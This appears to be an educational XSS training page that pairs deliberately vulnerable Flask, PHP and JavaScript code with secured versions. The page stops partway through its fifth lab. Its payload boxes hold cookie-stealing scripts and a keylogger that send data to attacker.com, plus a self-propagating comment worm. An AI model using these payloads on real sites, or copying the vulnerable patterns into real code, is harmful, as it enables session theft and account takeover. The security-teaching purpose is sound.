<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS Code Review Playground | Security Learning</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css">
    <style>
        :root {
            --bg-primary: #0a0e17;
            --bg-secondary: #131a2b;
            --bg-tertiary: #1a2540;
            --accent-red: #ff4757;
            --accent-green: #2ed573;
            --accent-blue: #3742fa;
            --accent-yellow: #ffa502;
            --accent-purple: #8b5cf6;
            --accent-cyan: #00d4ff;
            --accent-pink: #ff6b9d;
            --accent-orange: #ff9f43;
            --text-primary: #e2e8f0;
            --text-secondary: #94a3b8;
            --border-color: #2a3a5c;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: var(--bg-primary);
            color: var(--text-primary);
            min-height: 100vh;
            overflow-x: hidden;
        }

        .header {
            background: linear-gradient(135deg, var(--bg-secondary) 0%, var(--bg-tertiary) 100%);
            padding: 20px 40px;
            border-bottom: 1px solid var(--border-color);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .header h1 {
            font-size: 1.8rem;
            background: linear-gradient(135deg, var(--accent-red), var(--accent-orange));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .header-badge { display: flex; gap: 10px; }

        .badge {
            padding: 6px 14px;
            border-radius: 20px;
            font-size: 0.75rem;
            font-weight: 600;
            text-transform: uppercase;
        }

        .badge-lab {
            background: rgba(255, 71, 87, 0.2);
            color: var(--accent-red);
            border: 1px solid var(--accent-red);
        }

        .badge-count {
            background: rgba(255, 159, 67, 0.2);
            color: var(--accent-orange);
            border: 1px solid var(--accent-orange);
        }

        .main-container { display: flex; height: calc(100vh - 80px); }

        .sidebar {
            width: 340px;
            background: var(--bg-secondary);
            border-right: 1px solid var(--border-color);
            overflow-y: auto;
            padding: 20px 0;
        }

        .sidebar-section { margin-bottom: 25px; }

        .sidebar-title {
            padding: 10px 20px;
            font-size: 0.75rem;
            text-transform: uppercase;
            letter-spacing: 1px;
            color: var(--text-secondary);
            font-weight: 600;
        }

        .lab-item {
            padding: 12px 20px;
            cursor: pointer;
            border-left: 3px solid transparent;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .lab-item:hover {
            background: var(--bg-tertiary);
            border-left-color: var(--accent-red);
        }

        .lab-item.active {
            background: var(--bg-tertiary);
            border-left-color: var(--accent-orange);
        }

        .lab-item i { font-size: 1.1rem; width: 24px; text-align: center; }
        .lab-item .lab-name { flex: 1; font-size: 0.85rem; }

        .lab-item .difficulty {
            font-size: 0.65rem;
            padding: 3px 8px;
            border-radius: 10px;
            text-transform: uppercase;
            font-weight: 600;
        }

        .difficulty.apprentice { background: rgba(46, 213, 115, 0.2); color: var(--accent-green); }
        .difficulty.practitioner { background: rgba(255, 165, 2, 0.2); color: var(--accent-yellow); }
        .difficulty.expert { background: rgba(255, 71, 87, 0.2); color: var(--accent-red); }

        .content-area { flex: 1; overflow-y: auto; padding: 30px 40px; }

        .lab-header { margin-bottom: 30px; }
        .lab-header h2 { font-size: 1.6rem; margin-bottom: 10px; color: var(--text-primary); }

        .lab-meta { display: flex; gap: 20px; flex-wrap: wrap; margin-bottom: 15px; }

        .meta-item {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 0.85rem;
            color: var(--text-secondary);
        }

        .meta-item i { color: var(--accent-red); }

        .lab-description { color: var(--text-secondary); line-height: 1.7; font-size: 0.95rem; }

        .vuln-section {
            background: var(--bg-secondary);
            border-radius: 12px;
            padding: 25px;
            margin-bottom: 25px;
            border: 1px solid var(--border-color);
        }

        .vuln-section h3 {
            font-size: 1.1rem;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .vuln-section h3 i { color: var(--accent-red); }

        .vuln-list { list-style: none; padding-left: 0; }

        .vuln-list li {
            padding: 8px 0;
            padding-left: 25px;
            position: relative;
            color: var(--text-secondary);
            line-height: 1.6;
        }

        .vuln-list li::before {
            content: '>';
            position: absolute;
            left: 0;
            color: var(--accent-red);
        }

        .code-review-section { margin-bottom: 30px; }

        .code-tabs { display: flex; gap: 10px; margin-bottom: 15px; }

        .code-tab {
            padding: 10px 20px;
            background: var(--bg-tertiary);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            cursor: pointer;
            font-size: 0.85rem;
            color: var(--text-secondary);
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .code-tab:hover { border-color: var(--accent-red); }

        .code-tab.active {
            background: var(--accent-red);
            border-color: var(--accent-red);
            color: white;
        }

        .code-tab.secure.active {
            background: var(--accent-green);
            border-color: var(--accent-green);
        }

        .code-container {
            position: relative;
            background: #1e1e1e;
            border-radius: 12px;
            overflow: hidden;
            border: 1px solid var(--border-color);
            margin-bottom: 15px;
        }

        .code-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 12px 20px;
            background: var(--bg-tertiary);
            border-bottom: 1px solid var(--border-color);
        }

        .code-filename {
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 0.85rem;
            color: var(--text-secondary);
        }

        .code-filename i { color: var(--accent-yellow); }

        .code-block {
            padding: 20px;
            overflow-x: auto;
            max-height: 500px;
            overflow-y: auto;
        }

        .code-block pre {
            margin: 0;
            font-family: 'Fira Code', 'Consolas', monospace;
            font-size: 0.9rem;
            line-height: 1.6;
        }

        .vuln-line {
            background: rgba(255, 71, 87, 0.15);
            display: block;
            margin: 0 -20px;
            padding: 0 20px;
            border-left: 3px solid var(--accent-red);
        }

        .secure-line {
            background: rgba(46, 213, 115, 0.15);
            display: block;
            margin: 0 -20px;
            padding: 0 20px;
            border-left: 3px solid var(--accent-green);
        }

        .payload-section {
            background: var(--bg-secondary);
            border-radius: 12px;
            padding: 25px;
            margin-bottom: 25px;
            border: 1px solid var(--border-color);
        }

        .payload-section h3 {
            font-size: 1.1rem;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
            color: var(--accent-green);
        }

        .payload-box {
            background: #1e1e1e;
            border-radius: 8px;
            padding: 15px 20px;
            margin-bottom: 15px;
            border: 1px solid var(--border-color);
            font-family: 'Fira Code', monospace;
            font-size: 0.85rem;
            color: var(--accent-yellow);
            overflow-x: auto;
            position: relative;
            white-space: pre-wrap;
            word-break: break-all;
        }

        .payload-box .payload-label {
            position: absolute;
            top: -10px;
            left: 15px;
            background: var(--bg-secondary);
            padding: 2px 10px;
            font-size: 0.7rem;
            color: var(--text-secondary);
            border-radius: 4px;
            font-family: 'Segoe UI', sans-serif;
        }

        .hidden { display: none !important; }

        ::-webkit-scrollbar { width: 8px; height: 8px; }
        ::-webkit-scrollbar-track { background: var(--bg-primary); }
        ::-webkit-scrollbar-thumb { background: var(--border-color); border-radius: 4px; }
        ::-webkit-scrollbar-thumb:hover { background: var(--accent-red); }

        .back-link {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            color: var(--text-secondary);
            text-decoration: none;
            font-size: 0.9rem;
            transition: color 0.3s;
        }

        .back-link:hover { color: var(--accent-red); }

        .info-box {
            background: rgba(139, 92, 246, 0.1);
            border: 1px solid var(--accent-purple);
            border-radius: 8px;
            padding: 15px 20px;
            margin-bottom: 20px;
            font-size: 0.9rem;
            color: var(--accent-purple);
        }

        .info-box i { margin-right: 10px; }

        .warning-box {
            background: rgba(255, 71, 87, 0.1);
            border: 1px solid var(--accent-red);
            border-radius: 8px;
            padding: 15px 20px;
            margin-bottom: 20px;
            font-size: 0.9rem;
            color: var(--accent-red);
        }

        .warning-box i { margin-right: 10px; }
    </style>
</head>
<body>
    <div class="header">
        <div>
            <a href="../tools.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Tools</a>
            <h1><i class="fas fa-code"></i> XSS Code Review Playground</h1>
        </div>
        <div class="header-badge">
            <span class="badge badge-lab">PortSwigger Labs</span>
            <span class="badge badge-count">10 Labs</span>
        </div>
    </div>

    <div class="main-container">
        <div class="sidebar">
            <div class="sidebar-section">
                <div class="sidebar-title"><i class="fas fa-bolt"></i> Basic XSS</div>
                <div class="lab-item active" data-lab="lab1-reflected">
                    <i class="fas fa-exchange-alt" style="color: var(--accent-red);"></i>
                    <span class="lab-name">Reflected XSS</span>
                    <span class="difficulty apprentice">Easy</span>
                </div>
                <div class="lab-item" data-lab="lab2-stored">
                    <i class="fas fa-database" style="color: var(--accent-orange);"></i>
                    <span class="lab-name">Stored XSS</span>
                    <span class="difficulty apprentice">Easy</span>
                </div>
            </div>

            <div class="sidebar-section">
                <div class="sidebar-title"><i class="fas fa-window-maximize"></i> DOM-Based XSS</div>
                <div class="lab-item" data-lab="lab3-dom-document-write">
                    <i class="fas fa-file-code" style="color: var(--accent-yellow);"></i>
                    <span class="lab-name">DOM XSS in document.write</span>
                    <span class="difficulty apprentice">Easy</span>
                </div>
                <div class="lab-item" data-lab="lab4-dom-innerhtml">
                    <i class="fas fa-code" style="color: var(--accent-purple);"></i>
                    <span class="lab-name">DOM XSS in innerHTML</span>
                    <span class="difficulty apprentice">Easy</span>
                </div>
                <div class="lab-item" data-lab="lab8-dom-jquery">
                    <i class="fab fa-js" style="color: var(--accent-cyan);"></i>
                    <span class="lab-name">DOM XSS in jQuery</span>
                    <span class="difficulty apprentice">Easy</span>
                </div>
            </div>

            <div class="sidebar-section">
                <div class="sidebar-title"><i class="fas fa-crosshairs"></i> Context-Specific XSS</div>
                <div class="lab-item" data-lab="lab5-attribute-context">
                    <i class="fas fa-tag" style="color: var(--accent-green);"></i>
                    <span class="lab-name">XSS in Attribute Context</span>
                    <span class="difficulty practitioner">Med</span>
                </div>
                <div class="lab-item" data-lab="lab6-javascript-string">
                    <i class="fas fa-quote-right" style="color: var(--accent-pink);"></i>
                    <span class="lab-name">XSS in JavaScript String</span>
                    <span class="difficulty practitioner">Med</span>
                </div>
            </div>

            <div class="sidebar-section">
                <div class="sidebar-title"><i class="fas fa-shield-alt"></i> Filter Bypass</div>
                <div class="lab-item" data-lab="lab7-tag-filtering">
                    <i class="fas fa-filter" style="color: var(--accent-blue);"></i>
                    <span class="lab-name">XSS with Tag Filtering</span>
                    <span class="difficulty practitioner">Med</span>
                </div>
                <div class="lab-item" data-lab="lab9-angularjs">
                    <i class="fab fa-angular" style="color: var(--accent-red);"></i>
                    <span class="lab-name">XSS in AngularJS</span>
                    <span class="difficulty practitioner">Med</span>
                </div>
                <div class="lab-item" data-lab="lab10-csp-bypass">
                    <i class="fas fa-lock-open" style="color: var(--accent-orange);"></i>
                    <span class="lab-name">XSS with CSP Bypass</span>
                    <span class="difficulty expert">Hard</span>
                </div>
            </div>
        </div>

        <div class="content-area">
            <!-- Lab 1: Reflected XSS -->
            <div id="lab1-reflected" class="lab-content">
                <div class="lab-header">
                    <h2>Lab 1: Reflected XSS into HTML Context</h2>
                    <div class="lab-meta">
                        <span class="meta-item"><i class="fas fa-signal"></i> Apprentice</span>
                        <span class="meta-item"><i class="fas fa-clock"></i> 5 minutes</span>
                        <span class="meta-item"><i class="fas fa-tag"></i> Reflected, HTML Context</span>
                    </div>
                    <p class="lab-description">
                        The application reflects user input directly into HTML without any encoding or sanitization.
                        Attackers can inject arbitrary HTML/JavaScript that executes in victims' browsers.
                    </p>
                </div>

                <div class="info-box">
                    <i class="fas fa-info-circle"></i>
                    <strong>Reflected XSS:</strong> User input is immediately returned in the response without proper sanitization.
                    The payload is delivered via URL parameters, form inputs, or HTTP headers.
                </div>

                <div class="vuln-section">
                    <h3><i class="fas fa-bug"></i> Vulnerability Explanation</h3>
                    <ul class="vuln-list">
                        <li>User input placed directly in HTML without encoding</li>
                        <li>No input validation or output encoding applied</li>
                        <li>Attacker crafts malicious URL with XSS payload</li>
                        <li>Victim clicks link, script executes in their browser context</li>
                    </ul>
                </div>

                <div class="code-review-section">
                    <div class="code-tabs">
                        <button class="code-tab active" data-view="vulnerable" data-lab="lab1">
                            <i class="fas fa-bug"></i> Vulnerable Code
                        </button>
                        <button class="code-tab secure" data-view="secure" data-lab="lab1">
                            <i class="fas fa-shield-alt"></i> Secure Code
                        </button>
                    </div>

                    <div class="code-container" id="lab1-vulnerable">
                        <div class="code-header">
                            <span class="code-filename"><i class="fab fa-python"></i> search.py (Flask)</span>
                        </div>
                        <div class="code-block">
                            <pre><code class="language-python">from flask import Flask, request

app = Flask(__name__)

@app.route('/search')
def search():
    query = request.args.get('q', '')

<span class="vuln-line">    # VULNERABLE: User input directly in HTML without encoding!</span>
<span class="vuln-line">    return f'''</span>
<span class="vuln-line">    &lt;html&gt;</span>
<span class="vuln-line">    &lt;body&gt;</span>
<span class="vuln-line">        &lt;h1&gt;Search Results&lt;/h1&gt;</span>
<span class="vuln-line">        &lt;p&gt;You searched for: {query}&lt;/p&gt;</span>
<span class="vuln-line">        &lt;div id="results"&gt;No results found&lt;/div&gt;</span>
<span class="vuln-line">    &lt;/body&gt;</span>
<span class="vuln-line">    &lt;/html&gt;</span>
<span class="vuln-line">    '''</span></code></pre>
                        </div>
                    </div>

                    <div class="code-container hidden" id="lab1-secure">
                        <div class="code-header">
                            <span class="code-filename"><i class="fab fa-python"></i> search.py (Flask)</span>
                        </div>
                        <div class="code-block">
                            <pre><code class="language-python">from flask import Flask, request, render_template_string
from markupsafe import escape

app = Flask(__name__)

@app.route('/search')
def search():
    query = request.args.get('q', '')

<span class="secure-line">    # SECURE: HTML encode user input before rendering</span>
<span class="secure-line">    safe_query = escape(query)</span>

    return f'''
    &lt;html&gt;
    &lt;body&gt;
        &lt;h1&gt;Search Results&lt;/h1&gt;
<span class="secure-line">        &lt;p&gt;You searched for: {safe_query}&lt;/p&gt;</span>
        &lt;div id="results"&gt;No results found&lt;/div&gt;
    &lt;/body&gt;
    &lt;/html&gt;
    '''

# Even better: Use templates with auto-escaping
@app.route('/search-secure')
def search_secure():
    query = request.args.get('q', '')
<span class="secure-line">    # Jinja2 auto-escapes by default</span>
<span class="secure-line">    return render_template('search.html', query=query)</span></code></pre>
                        </div>
                    </div>
                </div>

                <div class="payload-section">
                    <h3><i class="fas fa-terminal"></i> Exploitation Payloads</h3>
                    <div class="payload-box">
                        <span class="payload-label">Basic Script Injection</span>
&lt;script&gt;alert('XSS')&lt;/script&gt;
                    </div>
                    <div class="payload-box">
                        <span class="payload-label">Cookie Stealing</span>
&lt;script&gt;new Image().src="https://attacker.com/steal?c="+document.cookie&lt;/script&gt;
                    </div>
                    <div class="payload-box">
                        <span class="payload-label">Event Handler</span>
&lt;img src=x onerror=alert('XSS')&gt;
                    </div>
                    <div class="payload-box">
                        <span class="payload-label">SVG Payload</span>
&lt;svg onload=alert('XSS')&gt;
                    </div>
                    <div class="payload-box">
                        <span class="payload-label">Full Attack URL</span>
https://vulnerable.com/search?q=&lt;script&gt;document.location='https://attacker.com/steal?c='+document.cookie&lt;/script&gt;
                    </div>
                </div>
            </div>

            <!-- Lab 2: Stored XSS -->
            <div id="lab2-stored" class="lab-content hidden">
                <div class="lab-header">
                    <h2>Lab 2: Stored XSS into HTML Context</h2>
                    <div class="lab-meta">
                        <span class="meta-item"><i class="fas fa-signal"></i> Apprentice</span>
                        <span class="meta-item"><i class="fas fa-clock"></i> 10 minutes</span>
                        <span class="meta-item"><i class="fas fa-tag"></i> Stored, Persistent</span>
                    </div>
                    <p class="lab-description">
                        The application stores user input in the database and displays it to other users without sanitization.
                        This is more dangerous than reflected XSS as it affects all users viewing the compromised content.
                    </p>
                </div>

                <div class="warning-box">
                    <i class="fas fa-exclamation-triangle"></i>
                    <strong>High Impact:</strong> Stored XSS is more dangerous than reflected XSS because the payload
                    persists and executes for every user who views the affected page, without requiring a malicious link.
                </div>

                <div class="vuln-section">
                    <h3><i class="fas fa-bug"></i> Vulnerability Explanation</h3>
                    <ul class="vuln-list">
                        <li>Malicious input stored in database (comments, profiles, posts)</li>
                        <li>No sanitization on input or output</li>
                        <li>Every user viewing the page executes the attacker's script</li>
                        <li>Can lead to worms, account takeover, defacement</li>
                    </ul>
                </div>

                <div class="code-review-section">
                    <div class="code-tabs">
                        <button class="code-tab active" data-view="vulnerable" data-lab="lab2">
                            <i class="fas fa-bug"></i> Vulnerable Code
                        </button>
                        <button class="code-tab secure" data-view="secure" data-lab="lab2">
                            <i class="fas fa-shield-alt"></i> Secure Code
                        </button>
                    </div>

                    <div class="code-container" id="lab2-vulnerable">
                        <div class="code-header">
                            <span class="code-filename"><i class="fab fa-php"></i> comments.php</span>
                        </div>
                        <div class="code-block">
                            <pre><code class="language-php">&lt;?php
// Store comment - NO SANITIZATION
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $comment = $_POST['comment'];
    $username = $_SESSION['username'];

<span class="vuln-line">    // VULNERABLE: Storing raw user input</span>
<span class="vuln-line">    $stmt = $pdo-&gt;prepare("INSERT INTO comments (user, content) VALUES (?, ?)");</span>
<span class="vuln-line">    $stmt-&gt;execute([$username, $comment]);</span>
}

// Display comments - NO ENCODING
$comments = $pdo-&gt;query("SELECT * FROM comments ORDER BY id DESC")-&gt;fetchAll();
?&gt;

&lt;div class="comments"&gt;
    &lt;?php foreach ($comments as $comment): ?&gt;
        &lt;div class="comment"&gt;
            &lt;strong&gt;&lt;?= $comment['user'] ?&gt;&lt;/strong&gt;
<span class="vuln-line">            &lt;!-- VULNERABLE: Raw output without encoding --&gt;</span>
<span class="vuln-line">            &lt;p&gt;&lt;?= $comment['content'] ?&gt;&lt;/p&gt;</span>
        &lt;/div&gt;
    &lt;?php endforeach; ?&gt;
&lt;/div&gt;</code></pre>
                        </div>
                    </div>

                    <div class="code-container hidden" id="lab2-secure">
                        <div class="code-header">
                            <span class="code-filename"><i class="fab fa-php"></i> comments.php</span>
                        </div>
                        <div class="code-block">
                            <pre><code class="language-php">&lt;?php
// Store comment with validation
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $comment = $_POST['comment'];
    $username = $_SESSION['username'];

<span class="secure-line">    // SECURE: Validate and sanitize input</span>
<span class="secure-line">    // Strip HTML tags for plain text comments</span>
<span class="secure-line">    $clean_comment = strip_tags($comment);</span>
<span class="secure-line">    </span>
<span class="secure-line">    // Or use HTMLPurifier for rich text</span>
<span class="secure-line">    // $purifier = new HTMLPurifier();</span>
<span class="secure-line">    // $clean_comment = $purifier-&gt;purify($comment);</span>

    $stmt = $pdo-&gt;prepare("INSERT INTO comments (user, content) VALUES (?, ?)");
    $stmt-&gt;execute([$username, $clean_comment]);
}

// Display comments
$comments = $pdo-&gt;query("SELECT * FROM comments ORDER BY id DESC")-&gt;fetchAll();
?&gt;

&lt;div class="comments"&gt;
    &lt;?php foreach ($comments as $comment): ?&gt;
        &lt;div class="comment"&gt;
<span class="secure-line">            &lt;!-- SECURE: HTML encode output --&gt;</span>
<span class="secure-line">            &lt;strong&gt;&lt;?= htmlspecialchars($comment['user'], ENT_QUOTES, 'UTF-8') ?&gt;&lt;/strong&gt;</span>
<span class="secure-line">            &lt;p&gt;&lt;?= htmlspecialchars($comment['content'], ENT_QUOTES, 'UTF-8') ?&gt;&lt;/p&gt;</span>
        &lt;/div&gt;
    &lt;?php endforeach; ?&gt;
&lt;/div&gt;</code></pre>
                        </div>
                    </div>
                </div>

                <div class="payload-section">
                    <h3><i class="fas fa-terminal"></i> Exploitation Payloads</h3>
                    <div class="payload-box">
                        <span class="payload-label">Comment XSS</span>
Great post! &lt;script&gt;alert('XSS')&lt;/script&gt;
                    </div>
                    <div class="payload-box">
                        <span class="payload-label">Session Hijacking</span>
Nice article! &lt;script&gt;fetch('https://attacker.com/log?cookie='+document.cookie)&lt;/script&gt;
                    </div>
                    <div class="payload-box">
                        <span class="payload-label">Keylogger Injection</span>
&lt;script&gt;
document.onkeypress=function(e){
  fetch('https://attacker.com/keys?k='+e.key);
}
&lt;/script&gt;
                    </div>
                    <div class="payload-box">
                        <span class="payload-label">XSS Worm (Self-Propagating)</span>
&lt;script&gt;
// Post the same comment as the victim
fetch('/api/comment', {
  method: 'POST',
  body: 'comment=' + encodeURIComponent(document.querySelector('.comment p').innerHTML)
});
&lt;/script&gt;
                    </div>
                </div>
            </div>

            <!-- Lab 3: DOM XSS in document.write -->
            <div id="lab3-dom-document-write" class="lab-content hidden">
                <div class="lab-header">
                    <h2>Lab 3: DOM XSS in document.write Sink</h2>
                    <div class="lab-meta">
                        <span class="meta-item"><i class="fas fa-signal"></i> Apprentice</span>
                        <span class="meta-item"><i class="fas fa-clock"></i> 10 minutes</span>
                        <span class="meta-item"><i class="fas fa-tag"></i> DOM, document.write</span>
                    </div>
                    <p class="lab-description">
                        The application uses document.write() with data from location.search without sanitization.
                        This creates a DOM-based XSS where the payload never reaches the server.
                    </p>
                </div>

                <div class="info-box">
                    <i class="fas fa-info-circle"></i>
                    <strong>DOM XSS:</strong> The vulnerability exists entirely in client-side JavaScript.
                    The malicious payload flows from a source (URL, referrer) to a dangerous sink (document.write, innerHTML).
                </div>

                <div class="vuln-section">
                    <h3><i class="fas fa-bug"></i> Vulnerability Explanation</h3>
                    <ul class="vuln-list">
                        <li>JavaScript reads data from URL (location.search, location.hash)</li>
                        <li>Data passed to dangerous sink like document.write()</li>
                        <li>No server-side involvement - pure client-side vulnerability</li>
                        <li>Payload may not appear in server logs, harder to detect</li>
                    </ul>
                </div>

                <div class="code-review-section">
                    <div class="code-tabs">
                        <button class="code-tab active" data-view="vulnerable" data-lab="lab3">
                            <i class="fas fa-bug"></i> Vulnerable Code
                        </button>
                        <button class="code-tab secure" data-view="secure" data-lab="lab3">
                            <i class="fas fa-shield-alt"></i> Secure Code
                        </button>
                    </div>

                    <div class="code-container" id="lab3-vulnerable">
                        <div class="code-header">
                            <span class="code-filename"><i class="fab fa-js"></i> tracker.js</span>
                        </div>
                        <div class="code-block">
                            <pre><code class="language-javascript">// Track search queries for analytics
function trackSearchQuery() {
    // Source: URL parameter
    const urlParams = new URLSearchParams(window.location.search);
    const searchQuery = urlParams.get('search');

    if (searchQuery) {
<span class="vuln-line">        // VULNERABLE: document.write with unsanitized input</span>
<span class="vuln-line">        document.write('&lt;img src="/tracker?query=' + searchQuery + '"&gt;');</span>
    }
}

// Another vulnerable pattern
function displaySearchTerm() {
    const query = window.location.search.substring(1);

<span class="vuln-line">    // VULNERABLE: Directly writing URL data</span>
<span class="vuln-line">    document.write("&lt;h2&gt;Results for: " + query + "&lt;/h2&gt;");</span>
}

trackSearchQuery();
displaySearchTerm();</code></pre>
                        </div>
                    </div>

                    <div class="code-container hidden" id="lab3-secure">
                        <div class="code-header">
                            <span class="code-filename"><i class="fab fa-js"></i> tracker.js</span>
                        </div>
                        <div class="code-block">
                            <pre><code class="language-javascript">// Secure tracking function
function trackSearchQuery() {
    const urlParams = new URLSearchParams(window.location.search);
    const searchQuery = urlParams.get('search');

    if (searchQuery) {
<span class="secure-line">        // SECURE: Use DOM methods instead of document.write</span>
<span class="secure-line">        const img = document.createElement('img');</span>
<span class="secure-line">        img.src = '/tracker?query=' + encodeURIComponent(searchQuery);</span>
<span class="secure-line">        document.body.appendChild(img);</span>
    }
}

// Secure display function
function displaySearchTerm() {
    const urlParams = new URLSearchParams(window.location.search);
    const query = urlParams.get('q') || '';

<span class="secure-line">    // SECURE: Use textContent instead of innerHTML/document.write</span>
<span class="secure-line">    const heading = document.createElement('h2');</span>
<span class="secure-line">    heading.textContent = 'Results for: ' + query;</span>
<span class="secure-line">    document.getElementById('results').prepend(heading);</span>
}

// Helper function to escape HTML
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

trackSearchQuery();
displaySearchTerm();</code></pre>
                        </div>
                    </div>
                </div>

                <div class="payload-section">
                    <h3><i class="fas fa-terminal"></i> Exploitation Payloads</h3>
                    <div class="payload-box">
                        <span class="payload-label">Break Out of img Tag</span>
"&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;
                    </div>
                    <div class="payload-box">
                        <span class="payload-label">Event Handler in img</span>
" onerror="alert('XSS')
                    </div>
                    <div class="payload-box">
                        <span class="payload-label">Full Attack URL</span>
https://vulnerable.com/search?search="&gt;&lt;svg/onload=alert('XSS')&gt;
                    </div>
                    <div class="payload-box">
                        <span class="payload-label">Close Tag and Inject Script</span>
"&gt;&lt;/img&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;
                    </div>
                </div>
            </div>

            <!-- Lab 4: DOM XSS in innerHTML -->
            <div id="lab4-dom-innerhtml" class="lab-content hidden">
                <div class="lab-header">
                    <h2>Lab 4: DOM XSS in innerHTML Sink</h2>
                    <div class="lab-meta">
                        <span class="meta-item"><i class="fas fa-signal"></i> Apprentice</span>
                        <span class="meta-item"><i class="fas fa-clock"></i> 10 minutes</span>
                        <span class="meta-item"><i class="fas fa-tag"></i> DOM, innerHTML</span>
                    </div>
                    <p class="lab-description">
                        The application uses innerHTML to insert user-controlled data into the page.
                        While innerHTML doesn't execute script tags, event handlers still work.
                    </p>
                </div>

                <div class="info-box">
                    <i class="fas fa-info-circle"></i>
                    <strong>innerHTML Quirk:</strong> Script tags inserted via innerHTML don't execute,
                    but event handlers like onerror, onload, onmouseover still fire!
                </div>

                <div class="vuln-section">
                    <h3><i class="fas fa-bug"></i> Vulnerability Explanation</h3>
                    <ul class="vuln-list">
                        <li>innerHTML parses HTML but doesn't execute script tags</li>
                        <li>Event handlers (onerror, onload) still execute JavaScript</li>
                        <li>Common in single-page applications updating content dynamically</li>
                        <li>Can lead to DOM clobbering attacks as well</li>
                    </ul>
                </div>

                <div class="code-review-section">
                    <div class="code-tabs">
                        <button class="code-tab active" data-view="vulnerable" data-lab="lab4">
                            <i class="fas fa-bug"></i> Vulnerable Code
                        </button>
                        <button class="code-tab secure" data-view="secure" data-lab="lab4">
                            <i class="fas fa-shield-alt"></i> Secure Code
                        </button>
                    </div>

                    <div class="code-container" id="lab4-vulnerable">
                        <div class="code-header">
                            <span class="code-filename"><i class="fab fa-js"></i> search-results.js</span>
                        </div>
                        <div class="code-block">
                            <pre><code class="language-javascript">// Display search results dynamically
function displayResults() {
    const searchTerm = new URLSearchParams(location.search).get('q');
    const resultsDiv = document.getElementById('searchResults');

    if (searchTerm) {
<span class="vuln-line">        // VULNERABLE: innerHTML with user input</span>
<span class="vuln-line">        resultsDiv.innerHTML = '&lt;p&gt;Searching for: ' + searchTerm + '&lt;/p&gt;';</span>

        // Fetch and display results
        fetchResults(searchTerm);
    }
}

function displayUserMessage(message) {
<span class="vuln-line">    // VULNERABLE: User message displayed via innerHTML</span>
<span class="vuln-line">    document.getElementById('messageBox').innerHTML = message;</span>
}

// Called when hash changes (SPA navigation)
window.onhashchange = function() {
    const content = decodeURIComponent(location.hash.slice(1));
<span class="vuln-line">    // VULNERABLE: Hash-based DOM XSS</span>
<span class="vuln-line">    document.getElementById('content').innerHTML = content;</span>
}</code></pre>
                        </div>
                    </div>

                    <div class="code-container hidden" id="lab4-secure">
                        <div class="code-header">
                            <span class="code-filename"><i class="fab fa-js"></i> search-results.js</span>
                        </div>
                        <div class="code-block">
                            <pre><code class="language-javascript">// Display search results securely
function displayResults() {
    const searchTerm = new URLSearchParams(location.search).get('q');
    const resultsDiv = document.getElementById('searchResults');

    if (searchTerm) {
<span class="secure-line">        // SECURE: Use textContent for plain text</span>
<span class="secure-line">        const p = document.createElement('p');</span>
<span class="secure-line">        p.textContent = 'Searching for: ' + searchTerm;</span>
<span class="secure-line">        resultsDiv.innerHTML = ''; // Clear previous</span>
<span class="secure-line">        resultsDiv.appendChild(p);</span>

        fetchResults(searchTerm);
    }
}

function displayUserMessage(message) {
<span class="secure-line">    // SECURE: Sanitize HTML with DOMPurify</span>
<span class="secure-line">    const clean = DOMPurify.sanitize(message);</span>
<span class="secure-line">    document.getElementById('messageBox').innerHTML = clean;</span>
}

// Alternative: Create elements safely
function safeSetContent(elementId, htmlContent) {
<span class="secure-line">    // SECURE: Use DOMPurify for any HTML content</span>
<span class="secure-line">    const clean = DOMPurify.sanitize(htmlContent, {</span>
<span class="secure-line">        ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],</span>
<span class="secure-line">        ALLOWED_ATTR: []</span>
<span class="secure-line">    });</span>
<span class="secure-line">    document.getElementById(elementId).innerHTML = clean;</span>
}</code></pre>
                        </div>
                    </div>
                </div>

                <div class="payload-section">
                    <h3><i class="fas fa-terminal"></i> Exploitation Payloads</h3>
                    <div class="payload-box">
                        <span class="payload-label">img onerror (Script tags won't work with innerHTML)</span>
&lt;img src=x onerror=alert('XSS')&gt;
                    </div>
                    <div class="payload-box">
                        <span class="payload-label">SVG onload</span>
&lt;svg onload=alert('XSS')&gt;
                    </div>
                    <div class="payload-box">
                        <span class="payload-label">Body onload</span>
&lt;body onload=alert('XSS')&gt;
                    </div>
                    <div class="payload-box">
                        <span class="payload-label">iframe srcdoc</span>
&lt;iframe srcdoc="&lt;script&gt;alert('XSS')&lt;/script&gt;"&gt;
                    </div>
                    <div class="payload-box">
                        <span class="payload-label">Hash-based Attack URL</span>
https://vulnerable.com/page#&lt;img src=x onerror=alert(document.cookie)&gt;
                    </div>
                </div>
            </div>

            <!-- Lab 5: XSS in Attribute Context -->
            <div id="lab5-attribute-context" class="lab-content hidden">
                <div class="lab-header">
                    <h2>Lab 5: Reflected XSS in Attribute Context</h2>
                    <div class="lab-meta">
                        <span class="meta-item"><i class="fas fa-signal"></i> Practitioner</span>
                        <span class="meta-item"><i class="fas fa-clock"></i> 15 minutes</span>
